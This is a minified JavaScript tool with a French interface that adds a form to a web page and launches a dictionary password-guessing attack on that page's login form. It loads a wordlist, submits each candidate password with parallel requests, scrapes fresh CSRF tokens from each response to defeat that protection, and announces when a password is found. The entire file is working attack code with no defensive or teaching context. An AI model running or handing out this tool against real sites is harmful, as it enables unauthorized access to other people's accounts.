!function(){function e(e){if(e&&"FORM"===e.nodeName){var t,n,a={};for(t=e.elements.length-1;t>=0;t-=1)if(""!==e.elements[t].name)switch(e.elements[t].nodeName){case"INPUT":switch(e.elements[t].type){case"text":case"tel":case"email":case"hidden":case"password":case"button":case"reset":case"submit":a[e.elements[t].name]=e.elements[t].value;break;case"checkbox":case"radio":e.elements[t].checked&&(a[e.elements[t].name]=e.elements[t].value)}break;case"file":break;case"TEXTAREA":a[e.elements[t].name]=e.elements[t].value;break;case"SELECT":switch(e.elements[t].type){case"select-one":a[e.elements[t].name]=e.elements[t].value;break;case"select-multiple":for(n=e.elements[t].options.length-1;n>=0;n-=1)e.elements[t].options[n].selected&&(a[e.elements[t].name]=e.elements[t].options[n].value)}break;case"BUTTON":switch(e.elements[t].type){case"reset":case"submit":case"button":a[e.elements[t].name]=e.elements[t].value}}return a}}function t(e,t,n,a){var o=document.createElement("p"),s=document.createElement("label");s.for=n,s.textContent=e;var l=document.createElement("input");return l.id=n,l.name=n,l.type=t,void 0!==a&&(l.value=a),o.appendChild(s),o.appendChild(l),o}var n={};n.x=function(){if("undefined"!=typeof XMLHttpRequest)return new XMLHttpRequest;for(var e,t=["MSXML2.XmlHttp.6.0","MSXML2.XmlHttp.5.0","MSXML2.XmlHttp.4.0","MSXML2.XmlHttp.3.0","MSXML2.XmlHttp.2.0","Microsoft.XmlHttp"],n=0;n<t.length;n++)try{e=new ActiveXObject(t[n]);break}catch(e){}return e},n.send=function(e,t,a,o,s){void 0===s&&(s=!0);var l=n.x();l.open(a,e,s),l.onreadystatechange=function(){4==l.readyState&&t(l.responseText)},"POST"==a&&l.setRequestHeader("Content-type","application/x-www-form-urlencoded"),l.send(o)},n.get=function(e,t,a,o){var s=[];for(var l in t)s.push(encodeURIComponent(l)+"="+encodeURIComponent(t[l]));n.send(e+(s.length?"?"+s.join("&"):""),a,"GET",null,o)},n.post=function(e,t,a,o){var s=[];for(var l in t)s.push(encodeURIComponent(l)+"="+encodeURIComponent(t[l]));n.send(e,a,"POST",s.join("&"),o)};var a=document.createElement("form");document.body.appendChild(a),a.appendChild(t("Sélecteur du formulaire","text","form_selector")),a.appendChild(t("Liste de mots","file","word_list")),a.appendChild(t("Message attendu","text","displayed_message")),a.appendChild(t("Le message s'affiche en cas de succès","checkbox","on_success")),a.appendChild(t("Nom de la propriété token CSRF","text","csrf_token_key")),a.appendChild(t("Nom de la propriété password","text","password_key")),a.appendChild(t("Nombre de tentatives à la fois","number","speed",1)),a.appendChild(t("Démarrer","submit","start","Commencer l'attaque"));var o=document.createElement("button");o.id="stop",o.textContent="Arrêter l'attaque",a.appendChild(o);var s=document.createElement("p");a.appendChild(s);var l=!1;a.addEventListener("submit",function(t){t.preventDefault(),l=!1;var a=document.querySelector(document.getElementById("form_selector").value),o=document.getElementById("word_list").files[0],r=document.getElementById("displayed_message").value,d=document.getElementById("csrf_token_key").value,c=document.getElementById("password_key").value,m=document.getElementById("speed").value,i=document.getElementById("on_success").checked,u=e(a),p=new FileReader;p.onload=function(){s.textContent="Searching...";var e=p.result.split("\n"),t=a.action||"";t=t.replace(/#/,"");for(var o=0,f=function(){s.textContent="Looking for "+o+" over "+e.length;var m=e[o++];u[c]=m;var p=function(e){if(!l)if(i?e.match(r):!e.match(r))s.textContent="Password found : "+m,l=!0;else{var t=document.createElement("div");t.innerHTML=e.replace(/^[\s\S]*<body.*?>|<\/body>[\s\S]*$/gi,"");var n=t.querySelector('[name="'+d+'"]');n&&(tokenValue=n.value,u[d]=tokenValue),f()}};"get"===a.method.toLowerCase()?n.get(t,u,p):n.post(t,u,p)},v=0;v<m;v++)f()},p.readAsText(o)}),o.addEventListener("click",function(e){e.preventDefault(),l=!0})}();